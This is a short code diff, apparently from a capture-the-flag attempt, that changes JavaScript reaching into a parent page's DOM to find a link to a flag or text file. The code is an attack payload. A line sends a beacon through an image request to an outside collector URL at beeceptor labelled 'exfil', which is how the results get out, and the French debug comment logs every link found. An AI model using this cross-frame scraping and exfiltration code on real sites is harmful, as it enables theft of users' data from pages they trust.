@@ -8,11 +8,8 @@
           const links = [...parent.document.querySelectorAll('a')];
           console.log(links); // DEBUG : afficher tous les liens trouvés
 
-          const a = links.find(x => 
-            /file-.*\.txt$/.test(x.id || '') ||
-            /file-.*\.txt$/.test(x.href || '') ||
-            /flag\.txt$/.test(x.textContent || '')
-          );
+          const a = [...parent.document.querySelectorAll('a')]
+          .find(x => /file-.*\.txt$/.test(x.id || '') || /flag\.txt$/.test(x.href || ''));
 
           if (!a) {
             new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
